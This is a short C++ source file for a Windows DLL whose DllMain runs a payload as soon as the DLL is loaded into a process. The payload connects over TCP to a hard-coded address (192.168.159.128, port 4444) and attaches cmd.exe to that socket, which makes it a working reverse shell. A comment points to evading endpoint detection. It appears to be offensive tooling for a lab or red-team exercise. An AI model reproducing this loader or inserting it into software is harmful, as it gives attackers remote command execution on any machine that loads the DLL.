#include "pch.h"
#include "stdlib.h"
#define _WINSOCK_DEPRECATED_NO_WARNINGS
 
#include <winsock2.h>
#include <stdio.h>
 
#pragma comment(lib,"ws2_32")
using namespace std;
WSADATA wsaData;
SOCKET s1;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO sui;
PROCESS_INFORMATION pi;
void executepayload(void)
{
WSAStartup(MAKEWORD(2, 2), &wsaData);
s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
 
hax.sin_family = AF_INET;
hax.sin_port = htons(4444);
hax.sin_addr.s_addr = inet_addr("192.168.159.128");
 
WSAConnect(s1, (SOCKADDR*)& hax, sizeof(hax), NULL, NULL, NULL, NULL);
 
memset(&sui, 0, sizeof(sui));
sui.cb = sizeof(sui);
sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;
 
TCHAR commandLine[256] = L"cmd.exe";
CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi); // EDR Prevention using api hooking
}
BOOL APIENTRY DllMain(HMODULE hModule,
DWORD  ul_reason_for_call,
LPVOID lpReserved
)
{
switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
  	executepayload();
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DETACH:
  	break;
}
return TRUE;
}
 
 
